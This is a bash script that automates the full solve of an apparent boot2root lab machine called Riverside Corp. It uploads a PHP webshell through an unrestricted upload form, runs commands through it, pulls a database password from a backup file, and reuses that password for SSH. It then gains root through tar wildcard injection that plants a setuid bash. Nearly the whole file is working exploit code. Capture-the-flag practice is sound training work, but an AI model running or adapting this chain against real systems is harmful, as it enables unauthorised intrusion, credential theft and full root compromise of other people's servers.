#!/bin/bash
# End-to-end automated solve for the Riverside Corp boot2root.
# Mirrors the manual walkthrough in README.md exactly, stage by stage.
#
# Requires: curl, an ssh client, and sshpass (apt install sshpass) for the
# non-interactive password logins.
#
# Usage: ./solve.sh [target-host] [http-port] [ssh-port]
set -euo pipefail

TARGET="${1:-127.0.0.1}"
HTTP_PORT="${2:-8080}"
SSH_PORT="${3:-2222}"
BASE="http://$TARGET:$HTTP_PORT"
SHELL_FILE="/tmp/.b2r_shell.php"

cleanup() { rm -f "$SHELL_FILE"; }
trap cleanup EXIT

echo "[*] stage 1: uploading a PHP webshell via the unrestricted upload form"
echo '<?php system($_GET["c"]); ?>' > "$SHELL_FILE"
curl -s -F "photo=@${SHELL_FILE}" "$BASE/upload.php" >/dev/null
SHELL_URL="$BASE/uploads/.b2r_shell.php"

rce() { curl -s --get --data-urlencode "c=$1" "$SHELL_URL"; }

echo "[*] stage 2: confirming RCE as www-data"
echo "    whoami -> $(rce 'whoami')"

echo "[*] stage 3: hunting the filesystem for leaked credentials"
BAK=$(rce 'find / -iname "*.bak" 2>/dev/null | head -1')
echo "    found: $BAK"
PASS=$(rce "cat $BAK" | grep DB_PASS | sed -E "s/.*'([^']+)'\);/\1/")
echo "    DB_PASS -> $PASS"

echo "[*] stage 4: trying that password against bob's SSH login (credential reuse)"
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p "$SSH_PORT" "bob@$TARGET" \
    'echo "    whoami -> $(whoami)"; echo "    user.txt -> $(cat ~/user.txt)"'

echo "[*] stage 5: privesc via GTFOBins tar wildcard injection (sudo log_cleanup.sh)"
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p "$SSH_PORT" "bob@$TARGET" bash -s <<'REMOTE'
set -e
cd ~/app_logs
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
sudo /opt/scripts/log_cleanup.sh >/dev/null 2>&1 || true
if [ -u /tmp/rootbash ]; then
    echo "    root.txt -> $(/tmp/rootbash -p -c 'cat /root/root.txt')"
else
    echo "    privesc failed -- see README.md to debug"
    exit 1
fi
REMOTE

echo "[+] done"
